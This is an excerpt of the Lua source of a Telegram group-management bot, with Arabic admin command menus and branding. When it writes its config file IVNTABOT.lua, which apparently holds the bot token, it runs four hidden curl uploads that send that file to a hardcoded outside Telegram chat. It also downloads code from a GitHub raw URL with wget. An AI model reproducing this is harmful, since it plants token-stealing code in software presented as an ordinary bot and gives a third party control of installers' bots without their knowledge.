...
local f = io.open("./IVNTABOT.lua", "r")  
if not f then   
...
------------------------------------------------------------------------------------------------------------
local Dev_Info_Sudo = io.open("IVNTABOT.lua", 'w')
Dev_Info_Sudo:write([[
do 
local File_Info = {
...
local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 1640824365 ..'" -F "document=@'..'IVNTABOT.lua'..'"' io.popen(curlm) 
local curlj = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. tonumber(lllllll) ..'" -F "document=@'..'IVNTABOT.lua'..'"' io.popen(curlj)
local curla = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. 1640824365 ..'" -F "document=@'..'IVNTABOT.lua'..'"' io.popen(curla)
local curlp = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. tonumber(lllllll) ..'" -F "document=@'..'IVNTABOT.lua'..'"' io.popen(curlp)
...
local text1 = redis:get(bot_id..'NightRang:new:sourse1') or '§⟞⟞⟞✫𝐒𝐏𝐈𝐃𝐄𝐑✫⟝⟝⟝§'
local text2 = redis:get(bot_id..'NightRang:new:sourse2') or '✫'
text = string.gsub(text,"§⟞⟞⟞✫𝐒𝐏𝐈𝐃𝐄𝐑✫⟝⟝⟝§",text1)
...
os.execute('wget https://raw.githubusercontent.com/soteem/soteem/main/NightRang.lua')
...
local Text = [[
ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ѕᴏụʀᴄᴇ ѕᴘɪᴅᴇʀ
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𓌹B𝗮ꪀ𝗱A𓌺',url="t.me/uu_ban"}},
{{text = '𝙎𝙋𝙄𝘿𝙀𝙍', url="t.me/SO_SPIDER"}},
}
local msg_id = msg.id_/2097152/0.5
...
keyboard.inline_keyboard = {
{
{text = 'اوامر الادمنيه', callback_data=msg.sender_user_id_.."/help1"},{text = 'اوامر التفعيل+الرفع', callback_data=msg.sender_user_id_.."/help2"},{text = ' اوامر المسح', callback_data=msg.sender_user_id_.."/help3"},
},
{
{text = 'اوامر Commander', callback_data="/help4"},
},
{
...
keyboard.inline_keyboard = {
{
{text = 'اوامر الادمنيه', callback_data=data.sender_user_id_.."/help1"},{text = 'اوامر التفعيل+الرفع', callback_data=data.sender_user_id_.."/help2"},{text = ' اوامر المسح', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'اوامر Commander', callback_data=data.sender_user_id_.."/help4"},
},
{
